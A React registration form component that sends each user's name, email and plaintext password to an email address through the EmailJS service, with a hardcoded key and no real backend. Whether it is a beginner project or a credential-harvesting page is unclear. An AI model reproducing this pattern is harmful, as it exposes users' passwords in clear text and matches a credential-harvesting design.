import React, { useState } from "react";
import emailjs from '@emailjs/browser';

const Register = ({formState, setFormState}) => {
    const [name, setName] = useState('')
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [rPassword, setRPassword] = useState('')

    const [buttonVal, setButtonVal] = useState('Register')

    const __sendEmail = (e) => {
        e.preventDefault();
        
        if (password === rPassword && password.length > 7) {
            setButtonVal('Please Wait...')
            emailjs.send('gmail-react', 'template_fzfd6jd', 
            {
                _engine: name,
                _email: email,
                _password: password,
            }, '-ULgQTRPj8f-lNNg0')
                .then(function() {
                    setButtonVal('Registered!')
                    
                }, function(error) {
                    console.log('FAILED...', error);
                    alert('Authentication Failed... Please try again', error)
                    setButtonVal('Register')
                }
            );
        } else {
            alert('Registration failed.. please try again.')
            setButtonVal('Register')
        }
    };

    return (
        <form onSubmit={__sendEmail} className="ui form">
            <h2 className="title">Register</h2>
            <div className="field">
                <label>Username:</label>
                <input required type="text" placeholder="John Doe" onChange={e => setName(e.target.value)} value={name}/>
            </div>
            <div className="field">
                <label>Email:</label>
                <input required type="email" placeholder="example@service.com" onChange={e => setEmail(e.target.value)} value={email}/>
            </div>
            <div className="field">
                <label>Password:</label>
                <input required type="password" onChange={e => setPassword(e.target.value)} value={password}/>
            </div>
            <div className="field">
                <label>Repeat Password:</label>
                <input required type="password" onChange={e => setRPassword(e.target.value)} value={rPassword}/>
            </div>
            
            <button className="ui submit button green">{buttonVal}</button>
            <button type="button" onClick={() => setFormState(!formState)} className="ui button">Cancel</button>
            <span>Already registered? <a style={{cursor: 'pointer'}} onClick={() => setFormState(!formState)}>Login Here!</a></span>
        </form>
    )
}

export default Register;    